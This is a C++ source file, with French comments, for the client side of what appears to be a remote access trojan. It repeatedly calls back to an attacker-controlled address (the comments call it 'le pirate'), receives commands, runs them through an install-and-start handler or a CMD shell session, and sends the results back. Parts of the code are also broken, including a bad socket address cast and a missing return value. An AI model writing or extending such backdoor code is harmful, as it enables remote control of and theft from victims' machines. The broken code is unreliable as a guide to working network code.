//
// Created by Berlingot on 2023-04-20.
//

#include<dos.h>   //for delay()
#include <unistd.h>
#include "Connexion.h"
Connexion* Connexion::connexionptrreference = NULL;
bool Connexion::connected;



Connexion::Connexion(const char * adresseIP, unsigned short port, ConnexionType ConnexionTypearg) {
    connexiontype = ConnexionTypearg;
    this->adresseIP = adresseIP;
    this->port = port;
    //Démarrage des services necessaires
    if(MyPNet::Network::Initialize()){
        if(_socket.CreateSocket() == MyPNet::PResult::P_Success){
            std::cout << std::endl<< "Création du socket réussi"<<std::endl;

            std::cout << std::endl<< "Tentative de connexion au pirate"<<std::endl;
            while(pirateTrouvee == false) {
                if (_socket.ConnectTo(MyPNet::IPEndpoint(adresseIP, port)) == MyPNet::PResult::P_Success) {
                    pirateTrouvee = true;
                    std::cout << "Connexion établie" << std::endl;
                    connected = true;
                    connexionptrreference = this;
                    return;
                } else { std::cout << std::endl << "Tentative de connexion échoué." << std::endl << "Nouvelle tentative dans 5 secondes" << std::endl; sleep(5);}
            }
        }
    }
}

bool Connexion::Connect() {
    std::cout << "Lancement Connect" << std::endl;
    Connection = socket(AF_INET, SOCK_STREAM, NULL); //Set Connection socket

    if (connect(Connection, (SOCKADDR*)&adresseIP, sizeof(adresseIP)) != 0) //If we are unable to connect...
    {       std::cout << "Échec Connect" << std::endl;
        return false;
    }

    std::cout << "Connected!" << std::endl;
    _beginthreadex(NULL, NULL, (_beginthreadex_proc_type)processConnexion, NULL, NULL, NULL); //Create the client thread that will receive any data that the server sends.
    connected = true;
    return true;

    return false;
}

void Connexion::processConnexion() {
    MyPNet::PacketType packettype;

    while (true)
    {
        if (!connexionptrreference->identificationPacketTyoe(packettype)) //Get PacketType type
            break; //If there is an issue getting the PacketType type, exit this loop
        if (!connexionptrreference->ProcessPacketType(packettype)) //Process PacketType (PacketType type)
            break; //If there is an issue processing the PacketType, exit this loop
    }
    connected = false;
    //std::cout << "Lost connection to the server." << std::endl;
    if (connexionptrreference->CloseConnection()) //Try to close socket connection..., If connection socket was closed properly
    {
        std::cout << "Socket fermer" << std::endl;
    }
    else //If connection socket was not closed properly for some reason from our function
    {
        //todo socket impossible de fermer
    }
}

bool Connexion::CloseConnection() {

    return true;
}

bool Connexion::identificationPacketTyoe(MyPNet::PacketType _packettype) {
    int packettype;
    if (!Getint32_t(packettype))//Try to receive PacketType type... If PacketType type fails to be recv'd
        return false; //Return false: PacketType type not successfully received
    _packettype = (MyPNet::PacketType)packettype;
    return true;//Return true if we were successful in retrieving the PacketType type
}

bool Connexion::Getint32_t(int32_t &_int32_t) {
    if (!recvall((char*)&_int32_t, sizeof(int32_t))) //Try to receive int... If int fails to be recv'd
        return false; //Return false: Int not successfully received
    _int32_t = ntohl(_int32_t); //Convert long from Network Byte Order to Host Byte Order
    return true;//Return true if we were successful in retrieving the int
}

bool Connexion::recvall(char *data, int totalbytes) {
    int bytesreceived = 0; //Holds the total bytes received
    while (bytesreceived < totalbytes) //While we still have more bytes to recv
    {
        int RetnCheck = recv(Connection, data + bytesreceived, totalbytes - bytesreceived, NULL); //Try to recv remaining bytes
        if (RetnCheck == SOCKET_ERROR) //If there is a socket error while trying to recv bytes
            return false; //Return false - failed to recvall
        bytesreceived += RetnCheck; //Add to total bytes received
    }
    return true;
}

bool Connexion::ProcessPacketType(MyPNet::PacketType _PacketType) {

    switch (_PacketType)
    {
        case MyPNet::PacketType::Instruction:
        {
            std::string msg;
            if (!GetString(msg))
                return false;
            SendString(installationAndStart::processCommand(msg), MyPNet::PacketType::Instruction);
            break;
        }

        case MyPNet::PacketType::CMDCommand:
        {
            std::string msg;
            if (!GetString(msg))
                return false;
            if (CMD::cmdptr != NULL)
            {
                CMD::cmdptr->writeCMD(msg);											//MOST ANNOYING BUG: [FIXED]
                break;
            }
            else
            {
                SendString("Initiate a CMD session first.", MyPNet::PacketType::Warning);
                break;
            }
        }
    }
}


